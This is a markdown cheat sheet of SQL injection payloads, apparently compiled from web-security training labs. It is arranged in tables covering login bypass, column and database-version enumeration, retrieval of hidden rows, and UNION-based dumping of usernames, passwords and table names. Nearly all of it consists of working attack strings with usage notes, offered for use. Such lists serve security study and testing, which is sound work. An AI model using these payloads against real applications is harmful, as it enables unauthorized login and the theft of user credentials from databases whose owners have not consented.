# 📄 SQL Injection Payloads (Selected Topics)

This list contains practical SQL injection payloads categorized under 4 main topics from the labs.

---

## 🔐 Authentication and Logic Bypass

| Purpose | Payload | Usage |
|--------|---------|-------|
| Bypass login as administrator | `administrator'--` | Use in login form, leave password blank |
| Remove password check (general) | `' OR '1'='1'--` | Use in username/password/login fields |
| Force always-false condition (test) | `' AND 1=2--` | To test behavior when condition is false |

---

## 🧠 Database Information Enumeration

| Purpose | Payload | Usage |
|--------|---------|-------|
| Detect number of columns | `' ORDER BY 1--`, `' ORDER BY 2--`, etc. | Until error to find total columns |
| UNION with correct columns | `' UNION SELECT NULL,NULL--` | Adjust number of NULLs accordingly |
| Find DB version (MySQL) | `' UNION SELECT @@version,NULL--` | Displays version if visible |
| Find DB version (Oracle) | `' UNION SELECT banner,NULL FROM v$version--` | Oracle-specific version string |
| Find current DB name | `' UNION SELECT database(),NULL--` | For MySQL |

---

## 🔍 Retrieving Hidden Data

| Purpose | Payload | Usage |
|--------|---------|-------|
| Retrieve all products | `' OR 1=1--` | Inject into `category` or search parameter |
| Add logic to return hidden item | `' UNION SELECT NULL,NULL--` | After determining columns |
| Force incorrect filter bypass | `' OR category='Accessories'--` | Modify logic in `WHERE` clause |

---

## 🔗 UNION-based SQL Injection

| Purpose | Payload | Usage |
|--------|---------|-------|
| Find text column | `' UNION SELECT 'abc',NULL--` or `' UNION SELECT NULL,'abc'--` | Look for which column reflects text |
| Dump users | `' UNION SELECT username,password FROM users--` | If table/columns known |
| Merge user:pass in 1 column | `' UNION SELECT CONCAT(username,':',password),NULL FROM users--` | For single-column output |
| Combine values in PostgreSQL | `' UNION SELECT username || ':' || password,NULL FROM users--` | For PostgreSQL DBMS |
| Dump table names | `' UNION SELECT table_name,NULL FROM information_schema.tables--` | Useful for enumeration |

---



